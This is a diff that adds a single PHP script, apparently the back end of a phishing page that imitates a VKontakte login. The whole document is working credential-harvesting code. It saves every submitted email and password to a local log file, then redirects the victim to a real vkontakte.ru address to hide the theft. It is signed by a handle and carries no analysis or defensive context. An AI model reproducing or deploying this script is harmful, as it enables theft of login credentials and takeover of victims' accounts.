@@ -1,0 +1,1 @@
+<?php /* ############# #by_NoNameZ# ########### */ $f=fopen("log.txt","at"); flock($f,2); if(preg_match("/^([.0-9a-z_-]+)@(([0-9a-z-]+\.)+[0-9a-z]{2,4})$/i", $_POST['email'])&& !empty($_POST['pass'])){ fputs($f, $_POST['email'].";".$_POST['pass']." \n"); header("Location: http://vkontakte.ru/blank.php?code=10"); } else { header("Location: bad.htm"); } flock($f,3); fclose($f); ?>
